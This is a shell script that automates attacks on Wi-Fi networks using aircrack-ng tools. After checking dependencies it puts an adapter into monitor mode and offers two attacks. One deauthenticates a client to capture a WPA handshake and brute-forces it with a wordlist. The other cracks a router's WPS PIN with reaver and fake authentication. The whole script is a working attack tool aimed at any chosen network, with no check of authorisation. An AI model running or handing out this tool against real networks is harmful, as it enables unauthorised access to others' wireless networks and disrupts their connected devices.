#!/bin/sh
# script to use wpa bruteforce attack

clear								
echo "Welcome to my script to automate wifi cracking"
echo "--"
echo "If you are looking to crack a WPS secured network, a wordlist may not be needed"
echo "If you are going to do a WPA bruteforce attack, then please use a wordlist"
echo "If you don't have a wordlist yet, please download it and try again"
echo "--"
echo "And also, please have a wireless adapter which supports monitor mode and packet injection"
echo "---------------------------------------------------------"
if [[ $EUID -ne 0 ]]						#checks for root access
then
	echo "This script must be run as root"
	echo "Please run as root or run as 'sudo'"
	exit 1
fi

os="$( awk -F '=' '/^ID=/ {print $2}' /etc/os-release 2>&- )"	#checks the os information using awk

if [[ "${os}" == "arch" ]]
then
	flag="arch"
fi
if [[ "${os}" == "manjaro" ]]
then
	flag="manjaro"
fi
if [[ "${os}" == "debian" ]]
then
	flag="debian"
fi
if [[ "${os}" == "ubuntu" ]]
then
	flag="ubuntu"
fi
if [[ "${os}" == "mint" ]]
then
	flag="mint"
fi

#######

if [ $flag == "arch" -o $flag == "manjaro" ]				#checks if dependency is installed
then
	package=xterm
	if pacman -Qs $package > /dev/null ; 
	then
	  echo "The package $package is installed"
	else
	  echo "The package $package is not installed"
	  pacman -Sy xterm
	fi
	package=aircrack-ng
	if pacman -Qs $package > /dev/null ;
	then
	  echo "The package $package is installed"
	else
	  echo "The package $package is not installed"
	  pacman -Sy aircrack-ng
	fi
	package=cowsay
	if pacman -Qs $package > /dev/null ;
	then
	  echo "The package $package is installed"
	else
	  echo "The package $package is not installed"
	  pacman -Sy cowsay
	fi
fi

if [ $flag == "debian" -o $flag == "ubuntu" -o $flag == "mint" ]
then
	package=xterm
	dpkg -s $package &> /dev/null
	if [ $? -eq 0 ]; 
	then
	    echo "$package  is installed!"
	else
	    echo "$package  is NOT installed!"
	    apt update
	    apt install xterm
	fi
	package=aircrack-ng
	dpkg -s $package &> /dev/null
	if [ $? -eq 0 ]; 
	then
	    echo "$package  is installed!"
	else
	    echo "$package  is NOT installed!"
	    apt update
	    apt install aircrack-ng
	fi
	package=cowsay
	dpkg -s $package &> /dev/null
	if [ $? -eq 0 ]; 
	then
	    echo "$package  is installed!"
	else
	    echo "$package  is NOT installed!"
	    apt update
	    apt install cowsay
	fi
fi

echo "---------------------------------------------------------"

cowsay "May the force be with you."

echo "This is the range of wireless adapters you have got"
ifconfig

read -p "Enter the wireless adapter for monitor mode: " wlan

ifconfig $wlan down
iwconfig $wlan mode monitor
ifconfig $wlan up

echo "Choose 1 for WPA bruteforce attack with a wordlist"
echo "Or choose 2 for a WPS pin connection attempt"
read -p "option: " choice

if [ $choice == 1 ]
then
	echo "press Ctrl+C to stop the scan once you found the wifi you want to try"
	airodump-ng $wlan
	read -p "Please enter bssid of router: " bssid
	read -p "Please enter channel number: " channel

	echo "Now choose your target from the following"
	echo "press Ctrl+C to stop the scan once you found your target to deauth for handshake"
	airodump-ng --bssid $bssid --channel $channel $wlan

	read -p "Enter target bssid: " tbssid

	read -p "Enter filename of the file you want to store handshake : " filename
	echo "press Ctrl+C to stop once you got the wpa-handshake"

	xterm -title "App 1" -e "ifconfig ; airodump-ng --bssid $bssid --channel $channel --write $filename $wlan" &
	xterm -title "App 2" -e "ifconfig ; aireplay-ng --deauth 5 -a $bssid -c $tbssid $wlan"

	echo "If you've made it this far, you should already be having a wirdlist.txt file to be brute-forced with"
	read -p "Enter the name of the said file: " wordlist

	echo "Also, enter the .cap file newly generated by this script"

	xterm -title "App 3" -hold -e ls | ls

	read -p "Enter filename, in the full .cap format: " filename2
	aircrack-ng $filename2 -w $wordlist

else
	if [ $flag == "arch" -o $flag == "manjaro" ]				#checks if dependency is installed
	then
		package=reaver
		if pacman -Qs $package > /dev/null ; 
		then
		  echo "The package $package is installed"
		else
		  echo "The package $package is not installed"
		  pacman -Sy reaver
		fi
	fi
	if [ $flag == "debian" -o $flag == "ubuntu" -o $flag == "mint" ]
	then
		package=reaver
		dpkg -s $package &> /dev/null
		if [ $? -eq 0 ]; 
		then
		    echo "$package  is installed!"
		else
		    echo "$package  is NOT installed!"
		    apt update
		    apt install reaver
		fi
	fi
	echo "lck should be 'no' for WPS to work"
	wash --interface $wlan
	echo "----"
	read -p "Enter target wifi MAC address" bssid
	read -p "Enter target wifi channel number" channel
	ifconfig
	read -p "Enter your wireless adapter MAC address" mybssid
	echo "--"
	echo "P.S. if your process is failing for some reason, please restart the process."
	echo "If the problem still persists, then the WPS may be locked of that specific router."
	echo "Try for WPA bruteforce if you can't find luck."
	xterm -title "App 1" -e "ifconfig ; aireplay-ng --fakeauth 30 -a $bssid -h $mybssid $wlan" &
	xterm -title "App 2" -e "ifconfig ; reaver --bssid $bssid --channel $channel --interface $wlan -vvv --no-associate"
fi


